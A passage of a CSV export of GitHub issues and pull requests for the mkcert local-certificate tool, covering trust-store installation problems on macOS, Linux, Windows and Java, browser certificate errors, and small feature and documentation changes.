Is there a quick and easy way of also configuring my co-workers' machines to use mkcert with example-key.pem and example-cert.pem generated for my machine so that their browser wouldn't complain either?",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/200/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/200/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/200/events,https://github.com/FiloSottile/mkcert/issues/200,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/199,495073285,MDU6SXNzdWU0OTUwNzMyODU=,199,Support openssl pem file for mac os homebrew,354250,open,FALSE,NA,NA,5,2019-09-18T08:36:01Z,2020-12-06T22:18:34Z,NA,NONE,NA,"We discovered that mkcert did not work as expected with PHP on Mac OS when installed via Homebrew. The reason seems to be that PHP via homebrew is compiled against homebrews curl version, which in turn is using homebrews openssl, which provides his own root storage at `/usr/local/etc/openssl/cert.pem`. 

This file is not updated by `mkcert -install`. Therefore requests via PHP curl will not work with mkcert certificates.

Our propose would be to detect this file and print either a warning that this is not updated, but needs to be adjusted by the user, or to update this file. In any case a warning might be useful, as I expect the file to be managed by homebrew and the package. Therefore updates might remove the added mkcert root certificate. Maybe there is a concept like hooks inside of homebrew, allowing mkcert to re add his root certificate on every update.

Used versions:
PHP Version 7.0.33
brew info openssl
openssl: stable 1.0.2s (bottled) [keg-only]
brew info curl
curl: stable 7.66.0 (bottled), HEAD [keg-only]
brew info mkcert
mkcert: stable 1.4.0 (bottled)

Workaround right now:
```
cat ""$(mkcert -CAROOT)/rootCA.pem"" >> /usr/local/etc/openssl/cert.pem
```",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/199/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/199/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/199/events,https://github.com/FiloSottile/mkcert/issues/199,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/198,493796474,MDExOlB1bGxSZXF1ZXN0MzE3Njc4MTU5,198,"Add a basic functional test for mkcert, for #136",112444,open,FALSE,NA,NA,2,2019-09-15T22:54:21Z,2019-12-31T14:57:16Z,NA,NONE,NA,"#136 points out that mkcert is completely lacking tests.

This PR does a very basic functional test building, testing, and using the mkcert binary

* Build mkcert for current OS
* `mkcert -install`
* `mkcert localhost` to get a cert/key
* Run a server
* Hit the server and look for errors

The `go test -v` is added to the .travis.yml and passes on the single current linux environment (Ubuntu 16.04 with sudo enabled). 

A next step would be a matrix including Travis's other available Ubuntu versions, macOS, and WIndows if we can get past the confirmation step in `mkcert -install`.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/198/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/198/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/198/events,https://github.com/FiloSottile/mkcert/pull/198,https://api.github.com/repos/FiloSottile/mkcert/pulls/198
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/197,493746163,MDExOlB1bGxSZXF1ZXN0MzE3NjQzNzU1,197,mkcert now provides a version command,52411515,closed,FALSE,NA,NA,2,2019-09-15T14:44:09Z,2019-11-09T21:47:21Z,2019-11-09T21:47:21Z,NONE,NA,Issue #191 solved by this PR.,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/197/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/197/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/197/events,https://github.com/FiloSottile/mkcert/pull/197,https://api.github.com/repos/FiloSottile/mkcert/pulls/197
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/196,487749310,MDU6SXNzdWU0ODc3NDkzMTA=,196,Silent [No verbose],74367,closed,FALSE,NA,NA,1,2019-08-31T09:06:48Z,2019-09-10T13:52:24Z,2019-09-10T13:52:24Z,NONE,NA,"Hello, first thanks for this amazing tool.

I'm developing a bash file to create vhosts for my mac environment. I'm able to create a cert using mkcert, but the terminal shows all the ouput of mkcert.

There is an option to hide the ouput?

Thanks!",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/196/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/196/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/196/events,https://github.com/FiloSottile/mkcert/issues/196,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/195,487530321,MDU6SXNzdWU0ODc1MzAzMjE=,195,more ssl errors,2381461,closed,FALSE,NA,NA,1,2019-08-30T14:59:54Z,2019-09-10T13:40:54Z,2019-09-10T13:40:46Z,NONE,NA,"hello,

after installing mkcert cetificates on my local machine
and use generated certificates in a nginx container
docker-compose.yaml
```yaml
    volumes:
      - ./microservices.doc.pem:/etc/nginx/ssl/certif.pem
      - ./microservices.doc-key.pem:/etc/nginx/ssl/key.pem
```
nginx.conf
```conf
server {
    listen 443 ssl http2;
    server_name microservices.doc;
    ssl on;
    ssl_certificate /etc/nginx/ssl/certif.pem;
    ssl_certificate_key /etc/nginx/ssl/key.pem;
```
i have one of this errors : 

curl :
```bash
curl https://microservices.doc --noproxy microservices.doc -v           
* Rebuilt URL to: https://microservices.doc/
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to microservices.doc (127.0.0.1) port 443 (#0)
* ALPN, offering h2
* ALPN, offering http/1.1
* successfully set certificate verify locations:
*   CAfile: /etc/ssl/certs/ca-certificates.crt
  CApath: /etc/ssl/certs
* (304) (OUT), TLS handshake, Client hello (1):
* OpenSSL SSL_connect: SSL_ERROR_SYSCALL in connection to microservices.doc:443 
* Closing connection 0
curl: (35) OpenSSL SSL_connect: SSL_ERROR_SYSCALL in connection to microservices.doc:443 
```

firefox : 
PR_END_OF_FILE_ERROR

chrome : 
ERR_CONNECTION_RESET or ERR_CONNECTION_CLOSED

what did i wrong ?",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/195/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/195/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/195/events,https://github.com/FiloSottile/mkcert/issues/195,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/194,483987288,MDU6SXNzdWU0ODM5ODcyODg=,194,"scoop install mkcert, download url is not valid in window",17643027,closed,FALSE,NA,NA,4,2019-08-22T13:13:55Z,2019-08-23T05:53:25Z,2019-08-23T05:48:52Z,NONE,NA,"when i run
```
scoop install mkcert
```
in window shell .
and i dot know what should i do after this",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/194/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/194/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/194/events,https://github.com/FiloSottile/mkcert/issues/194,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/193,483071002,MDExOlB1bGxSZXF1ZXN0MzA5MjIxMDEz,193,"Use sudo when necessary for certutil (Ubuntu 16.04 at least), fixes #192",112444,closed,FALSE,NA,NA,3,2019-08-20T20:38:52Z,2019-11-09T23:18:19Z,2019-11-09T23:18:19Z,NONE,NA,"#192 points out that as of v1.4.0, `certutil -A` is not run with sufficient privileges. This seems to be a problem particularly on Ubuntu 16.04, but possibly on some other Debian-derivatives as well.

This PR checks to see if the path to the profile is writable; if it's not, it uses sudo to run `certutil -A` and `certutil -D` ",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/193/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/193/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/193/events,https://github.com/FiloSottile/mkcert/pull/193,https://api.github.com/repos/FiloSottile/mkcert/pulls/193
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/192,482552837,MDU6SXNzdWU0ODI1NTI4Mzc=,192,mkcert -install (v1.4.0) fails to run in Ubuntu 16.04: SEC_ERROR_READ_ONLY,112444,closed,FALSE,NA,NA,4,2019-08-19T22:12:41Z,2019-11-09T23:18:19Z,2019-11-09T23:18:19Z,NONE,NA,"Ubuntu 16.04, linuxbrew-installed mkcert v1.4.0, mkcert -install fails with certutil error:

```
mkcert -install
Created a new local CA at ""/home/circleci/.local/share/mkcert"" 💥
The local CA is now installed in the system trust store! ⚡️
ERROR: failed to execute ""certutil -A"": exit status 255

certutil: function failed: SEC_ERROR_READ_ONLY: security library: read-only database.
```",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/192/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/192/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/192/events,https://github.com/FiloSottile/mkcert/issues/192,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/191,482541763,MDU6SXNzdWU0ODI1NDE3NjM=,191,"mkcert should provide a version command, --version or similar",112444,closed,FALSE,NA,NA,0,2019-08-19T21:40:48Z,2019-11-09T21:47:21Z,2019-11-09T21:47:21Z,NONE,NA,"Especially at a time of compatibility support (Catalina, right now) it's super important to be able to query mkcert about what version it is. A `mkcert --version` would be awesome. ",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/191/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/191/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/191/events,https://github.com/FiloSottile/mkcert/issues/191,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/190,481556194,MDU6SXNzdWU0ODE1NTYxOTQ=,190,mkcert with zsh,625286,closed,FALSE,NA,NA,2,2019-08-16T10:55:55Z,2019-08-16T19:01:05Z,2019-08-16T19:00:59Z,NONE,NA,"Hi, 

sorry for the probably stupid question, but I'm more of a pixel pusher than a terminal guy. I switched from bash to zsh under Mac OS X (10.14.6). I copied everything from .bash_profile and .bashrc into .zshrc. Now I get the error message zsh: command not found: mkcert when calling mkcert.  I set the terminal back to bash and everything works. What am I doing wrong?

Mario",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/190/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/190/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/190/events,https://github.com/FiloSottile/mkcert/issues/190,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/189,481339789,MDU6SXNzdWU0ODEzMzk3ODk=,189,Suggestion: Continuous Fuzzing,16490766,closed,FALSE,NA,NA,2,2019-08-15T21:08:00Z,2019-08-16T20:44:06Z,2019-08-16T19:04:56Z,NONE,NA,"Hi, I'm Yevgeny Pats Founder of [Fuzzit](https://fuzzit.dev) - Continuous fuzzing as a service platform.

We have a free plan for OSS and I would be happy to contribute a PR if that's interesting.
The PR will include the following
- [go-fuzz](https://github.com/dvyukov/go-fuzz) fuzzers
- Continuous Fuzzing of master branch which will generate new corpus and look for new crashes
- Regression on every PR that will run the fuzzers through all the generated corpus and fixed crashes from previous step. This will prevent new or old bugs from crippling into master.

You can see our basic example [here](https://github.com/fuzzitdev/example-go) and you can see an example of ""in the wild"" integration [here](https://github.com/google/syzkaller).

Let me know if this is something worth working on.

Also, we have a [reward](https://fuzzit.dev/2019/08/12/announcing-rewards-for-go-rust-oss-projects/) program. If you are interested in implementing the fuzzers and the integration yourself I’ll be happy to reward you as well as to get unbiased feedback on how smooth the integration was.

Cheers,
Yevgeny
",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/189/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/189/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/189/events,https://github.com/FiloSottile/mkcert/issues/189,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/188,480804166,MDU6SXNzdWU0ODA4MDQxNjY=,188,update-ca-certificates not found on Debian sid,1083642,closed,FALSE,NA,NA,1,2019-08-14T17:41:36Z,2019-08-16T22:30:38Z,2019-08-16T22:24:18Z,NONE,NA,"By default, `/usr/sbin` is not on `PATH` for non-root users in Debian `sid`.

So, `binaryExists(""update-ca-certificates"")` returns `false` at:
https://github.com/FiloSottile/mkcert/blob/master/truststore_linux.go#L49
and `mkcert` fails to install in the system store (`Installing to the system store is not yet supported on this Linux`).

Simply running
```
PATH=$PATH:/usr/sbin mkcert -install
```
solves the issue, but it would be nice if `mkcert` could temporarily add `/usr/sbin` to `PATH` or search in it explicitly.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/188/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/188/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/188/events,https://github.com/FiloSottile/mkcert/issues/188,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/187,480470270,MDExOlB1bGxSZXF1ZXN0MzA3MTU5ODc5,187,"Make shorter certificate duration for catalina requirements, closes #174",112444,closed,FALSE,NA,NA,1,2019-08-14T04:03:54Z,2019-08-16T21:35:46Z,2019-08-16T21:35:46Z,NONE,NA,"Based on the discussion in #174, ""Certificate is not standards-compliant in Catalina""  this PR 
* Sets the start date to yesterday
* Sets the valid end date 823 days out. 

I think this is probably better in general than the approach in current master, which just pre-dates the cert to before June, since it probably deals with the actual requirement of the standard. ",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/187/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/187/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/187/events,https://github.com/FiloSottile/mkcert/pull/187,https://api.github.com/repos/FiloSottile/mkcert/pulls/187
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/186,479239310,MDU6SXNzdWU0NzkyMzkzMTA=,186,Mkcert doesn't work properly with firefox nightly?,53964371,closed,FALSE,NA,NA,2,2019-08-10T07:32:12Z,2020-10-25T23:42:23Z,2020-10-25T23:42:23Z,NONE,NA,"I am trying to generate some certificate for testing purpose and i could not make it work on firefox, only chrome is working. I have tried: 
```
$ mkcert -install
```
But I got some error: 
```
Using the local CA at ""/home/yourpc/.local/share/mkcert"" ✨
ERROR: failed to execute ""tee"": exit status 1

tee: /etc/ca-certificates/trust-source/anchors/mkcert_development_CA_149490715507430535598238403984841989935.crt: Permission denied
-----BEGIN CERTIFICATE-----
cGNAMTI3LjAuMC4xbG9jYWxob3N0MSkwJwYDVQQDDCBta2NlcnQgeW91cnBjQDEy
......
-----END CERTIFICATE-----
```
And So i tried it with root permission:
```
# mkcert -install
```
And I got this output. 
```
Using the local CA at ""/root/.local/share/mkcert"" ✨
```

After that, I tried to execute:
```
# mkcert example.com ""*.example.com"" example.test localhost 127.0.0.1 ::1 
```
And i got output: 
```
Using the local CA at ""/root/.local/share/mkcert"" ✨
Created a new certificate valid for the following names 📜
 - ""example.com""
 - ""*.example.com""
 - ""example.test""
 - ""localhost""
 - ""127.0.0.1""
 - ""::1""


Reminder: X.509 wildcards only go one level deep, so this won't match a.b.example.com ℹ️

The certificate is at ""./example.com+5.pem"" and the key at ""./example.com+5-key.pem"" ✅
```


From the first command, i believe there is something wrong already because in the main page from github, it should include:
```
The local CA is now installed in the system trust store! ⚡️
The local CA is now installed in the Firefox trust store (requires browser restart)!
(Java stuff too)
```

I am sure my JAVA_HOME is working properly. I have set it by:
```
export JAVA_HOME=$(readlink -f /usr/bin/javac | sed ""s:/bin/javac::"")
```
And verify it:
```
yourpc@127:~$ $JAVA_HOME
bash: /usr/lib/jvm/java-12-openjdk: Is a directory

[root@127 norin]# $JAVA_HOME
bash: /usr/lib/jvm/java-12-openjdk: Is a directory
```

I am not sure if i have to set *TRUST_STORES* in my environment variable too or not and i did not set it yet.

So, in summary, how can I solve this problem? To make firefox-nightly trust this certificate, and mkcert automatically add the certificate into something like trust store (i am not sure if this is the one it should be) so java application trust this certificate. Thank you.


Note: I am using Arch Linux, and Open JDK 12.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/186/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/186/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/186/events,https://github.com/FiloSottile/mkcert/issues/186,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/185,475200142,MDExOlB1bGxSZXF1ZXN0MzAyOTk5NjAx,185,Note `sudo` requirement,1461730,closed,FALSE,NA,NA,0,2019-07-31T15:05:52Z,2019-08-16T22:24:17Z,2019-08-16T22:24:17Z,NONE,NA,See issue #178.,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/185/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/185/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/185/events,https://github.com/FiloSottile/mkcert/pull/185,https://api.github.com/repos/FiloSottile/mkcert/pulls/185
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/184,474823278,MDU6SXNzdWU0NzQ4MjMyNzg=,184,Firefox Nightly might need a separate cert installation?,248078,closed,FALSE,NA,NA,2,2019-07-30T21:12:23Z,2019-07-30T21:29:24Z,2019-07-30T21:29:24Z,CONTRIBUTOR,NA,"Just just updated Firefox Nightly and it told me that it's storing data in a new, separate profile. At the same time, me local cert stopped working in Nightly. Perhaps the cert needs to be installed for Nightly separately?",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/184/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/184/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/184/events,https://github.com/FiloSottile/mkcert/issues/184,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/183,474620107,MDExOlB1bGxSZXF1ZXN0MzAyNTI4MjY0,183,darwin: drop 'sudo' from security commands where we can,120951,closed,FALSE,NA,NA,4,2019-07-30T14:29:59Z,2019-08-17T10:17:58Z,2019-07-31T16:12:54Z,CONTRIBUTOR,NA,"sudo (on macOS with the security cli) is only required when we access
the System Keychain and otherwise the OS will prompt the user
authorize the Keychain changes.

Issue: https://github.com/FiloSottile/mkcert/issues/178",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/183/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/183/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/183/events,https://github.com/FiloSottile/mkcert/pull/183,https://api.github.com/repos/FiloSottile/mkcert/pulls/183
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/182,473972390,MDU6SXNzdWU0NzM5NzIzOTA=,182,Running mkcert -install as root on Linux doesn't install into the Java trust store,4629505,closed,FALSE,NA,NA,3,2019-07-29T10:25:43Z,2020-07-07T12:02:07Z,2020-07-07T12:02:07Z,NONE,NA,"Probably a user error, but maybe the documentation/output could be improved.

I used `mkcert` successfully on my local machine, then tried the same on our CI server (Debian stretch) and got:

```
root@ci:~# export JAVA_HOME=""$(dirname $(dirname $(readlink -f $(which java))))""
root@ci:~# echo $JAVA_HOME 
/usr/lib/jvm/java-11-openjdk-amd64
root@ci:~# mkcert -install
Using the local CA at ""/root/.local/share/mkcert"" ✨
The local CA is now installed in the system trust store! ⚡️
```

No mention of the java trust store. It would be good if there was some output/warning about what went wrong. It took me a while to figure out that apparently I shouldn't run `mkcert` as root. Running the same commands as a different user works (and asks for `sudo` password).

Btw. when running `mkdir -install` a second time, there is also no mention of the java trust store.

First time:
```
user@ci:~$ mkcert -install
Using the local CA at ""/home/user/.local/share/mkcert"" ✨
Installing to the system store is not yet supported on this Linux 😣 but Firefox and/or Chrome/Chromium will still work.
You can also manually install the root certificate at ""/home/user/.local/share/mkcert/rootCA.pem"".
The local CA is now installed in Java's trust store! ☕️
```
Second time:
```
user@ci:~$ mkcert -install
Using the local CA at ""/home/user/.local/share/mkcert"" ✨
Installing to the system store is not yet supported on this Linux 😣 but Firefox and/or Chrome/Chromium will still work.
You can also manually install the root certificate at ""/home/user/.local/share/mkcert/rootCA.pem"".
```",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/182/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/182/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/182/events,https://github.com/FiloSottile/mkcert/issues/182,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/181,473031099,MDExOlB1bGxSZXF1ZXN0MzAxMjc4NDM3,181,Add link to Chocolatey in README,157270,closed,FALSE,NA,NA,0,2019-07-25T19:24:14Z,2019-07-25T19:59:22Z,2019-07-25T19:59:22Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/181/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/181/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/181/events,https://github.com/FiloSottile/mkcert/pull/181,https://api.github.com/repos/FiloSottile/mkcert/pulls/181
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/180,471166163,MDU6SXNzdWU0NzExNjYxNjM=,180,"""NET::ERR_CERT_AUTHORITY_INVALID"" in Chrome on macOS",1461730,closed,FALSE,NA,NA,27,2019-07-22T15:51:42Z,2021-02-22T15:27:35Z,2020-10-25T23:41:36Z,NONE,NA,"My computer is running macOS version ""10.14.5 (18F132)"". I'm testing in Chrome version ""75.0.3770.142 (Official Build) (64-bit)"". Chrome was updated recently, i.e. yesterday, from an unknown earlier version (tho fairly recent I think).

Several days ago `mkcert` seemed to be working as expected. Today I get the error mentioned in the title.

I was able to get it working again by manually adding the certificate to my ""login"" ""Certificates"" in the *Keychain Access* app by following the steps in [this answer](https://superuser.com/a/1235250/37845) to the following Super User question:

 - [ssl - How do I deal with NET:ERR_CERT_AUTHORITY_INVALID in Chrome? - Super User](https://superuser.com/questions/1083766/how-do-i-deal-with-neterr-cert-authority-invalid-in-chrome)

This might be related to this recently opened issue:

 - [""Certificate is not standards compliant"" on macOS Catalina · Issue #174](https://github.com/FiloSottile/mkcert/issues/174)",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/180/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/180/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/180/events,https://github.com/FiloSottile/mkcert/issues/180,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/179,470751838,MDExOlB1bGxSZXF1ZXN0Mjk5NjE2Mzcy,179,Fix markdown formatting,987638,closed,FALSE,NA,NA,1,2019-07-21T07:23:01Z,2019-07-21T12:07:10Z,2019-07-21T11:18:12Z,CONTRIBUTOR,NA,"It seems correctly show in GitHub, but this may not be shown correctly in other markdown readers.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/179/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/179/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/179/events,https://github.com/FiloSottile/mkcert/pull/179,https://api.github.com/repos/FiloSottile/mkcert/pulls/179
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/178,470552584,MDU6SXNzdWU0NzA1NTI1ODQ=,178,"What is the ""Password:"" for which I'm prompted when I run `mkcert -install` on a Mac?",1461730,closed,FALSE,NA,NA,7,2019-07-19T21:08:27Z,2019-08-16T22:24:17Z,2019-08-16T22:24:17Z,NONE,NA,"From a *Terminal* window:

```
$ mkcert -install
Created a new local CA at ""/Users/kenny/Library/Application Support/mkcert"" 💥
Password:
```

I'm pretty sure this is my Keychain password (the 'login' password for my user) but it's certainly not clear that that's what's being requested. Could this (or should) this be documented in the README? (I'd be willing to make a stab at doing so if it's considered helpful.)",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/178/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/178/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/178/events,https://github.com/FiloSottile/mkcert/issues/178,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/177,469078979,MDU6SXNzdWU0NjkwNzg5Nzk=,177,Certificate clash between mkcert generated certificates (macOS/Nginx/Dnsmasq),442617,closed,FALSE,NA,NA,1,2019-07-17T09:16:02Z,2019-07-17T10:18:57Z,2019-07-17T10:18:57Z,NONE,NA,"Apologies in advance, as the issue title doesn't begin to describe this ...

Current environment:

macOS - 10.14.5 / Mojave
Chrome - 75.0.3770.100 (Official Build) (64-bit)
Chrome Canary - 77.0.3854.3 (Official Build) canary (64-bit)
Safari - 12.1.1 (14607.2.6.1.1)
Safari Technology Preview - 87 (Safari 13.0, WebKit 14608.1.33.1)
Firefox - 68.0 (64-bit) (Quantum)

Installed via `homebrew` (2.1.7):

`mkcert` - 1.3.0
`nginx` - 1.71.1
`dnsmasq` - 2.80


I have `dnsmasq` configured to locally handle all DNS queries for the `.test` TLD via the following in `/usr/local/etc/dnsmasq.conf`

```
address=/test/127.0.0.1
```

With a corresponding `/etc/resolver/test` containing the following:

```
nameserver 127.0.0.1
```

I also have Nginx configured to serve two local domains with SSL enabled via `mkcert` certificates installed in `/usr/local/etc/ssl/certs`

* `garygale.test` and `www.garygale.test` (my personal domain)
* `www.getrentr.test` (a company domain I'm working on)

```
$ ls /usr/local/etc/ssl/certs/
garygale.test+1-key.pem   www.getrentr.test-key.pem
garygale.test+1.pem       www.getrentr.test.pem
```

My personal domain uses no third party assets, with the exception of Google Analytics with the new tracking code mechanism. All is working well and as expected.

My company domain uses several third party assets, including Google Tag Manager, Lead Forensics and Adobe Fonts.

The company domain's SSL certificate (`www.getrentr.test`), when viewed in Chrome, is valid and for the correct domain (`www.getrentr.test`).

<img width=""496"" alt=""www getrentr test-certificate"" src=""https://user-images.githubusercontent.com/442617/61361665-bb188900-a878-11e9-8f9c-8c51d0e22c48.png"">

When loading the company domain's site, I have `NET::ERR_CERT_COMMON_NAME_INVALID` certificate errors for Google Tag Manager (`https://www.googletagmanager.com/gtm.js?id=[redacted]`) and Adobe Fonts (`https://p.typekit.net/p.css?[redacted]`), but _not_ for Lead Forensics (`https://secure.kilo6alga.com/js/[redacted].js`).

Additionally, when visiting the Google Tag Manager and Adobe Fonts URLs in the browser, I get the `NET::ERR_CERT_COMMON_NAME_INVALID` error and the SSL certificates for both these domains appear to be using the other `mkcert` generated certificate for my (local) personal domain, rather than the SSL certificates for these actual target domains.

`p.typekit.net` certificate: 

<img width=""496"" alt=""p typekit net-certificate"" src=""https://user-images.githubusercontent.com/442617/61361709-d4213a00-a878-11e9-9d0f-b8b1d365b7ce.png"">

`googletagmanager.com` certificate: 

<img width=""496"" alt=""www googletagmanager com-certificate"" src=""https://user-images.githubusercontent.com/442617/61361717-dd120b80-a878-11e9-94d3-b15b6a97d566.png"">

This behaviour, with slightly different error messages due to browser differences, is repeated on Chrome Canary, Firefox, Safari and Safari Technology Preview.

I can't for the life of me figure out how this is happening; more specifically how the `mkcert` certificate for one domain is being used in place of some, but not all, third party assets.

I also freely admit that there's probably some unknown interaction between all the moving parts in this but despite many hours trying to narrow this down and work out what is going on, I have drawn a blank.

So basically ... help?",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/177/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/177/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/177/events,https://github.com/FiloSottile/mkcert/issues/177,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/176,467957834,MDU6SXNzdWU0Njc5NTc4MzQ=,176,"CA installation in windows throwing ERROR ""ERROR: add cert: Failed adding cert: The request is not supported""",4878990,open,FALSE,NA,NA,2,2019-07-15T06:17:56Z,2020-01-09T03:54:29Z,NA,NONE,NA,"Hi, 

Thanks to mkcert for providing us a great tool for multiple environments.
 Anyone, could you please give me a hint why I am getting the below error. The background is, I have a node js application which is taking help of mkcert to create a CA for Windows.  While starting the nodejs app, it ended with the error 

> (node:2192) UnhandledPromiseRejectionWarning: Error: Command failed: SET CAROOT=C:\Program Files (x86)\Test\cert && ""C:\Program Files (x86)\Test\cert\mkcert-v1.3.0-windows-amd64.exe"" -install -cert-file ""C:\Program Files (x86)\Test\cert\localhost.crt"" -key-file ""C:\Program Files (x86)\Test\cert\localhost.key"" localhost
> Created a new local CA at ""C:\Program Files (x86)\Test\cert"" ðŸ’¥
> ERROR: add cert: Failed adding cert: The request is not supported.


 Notes:  

-  I have customized the CARROT.
-   while looking at the mkcert code, the error is thrown by truststore_windows.go  at addCert, which is internally calling crypt32.dll. I am not sure what is going wrong with crypt32.dll . 
@FiloSottile , could you please have a look at this.
Thanks,             ",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/176/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/176/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/176/events,https://github.com/FiloSottile/mkcert/issues/176,NA
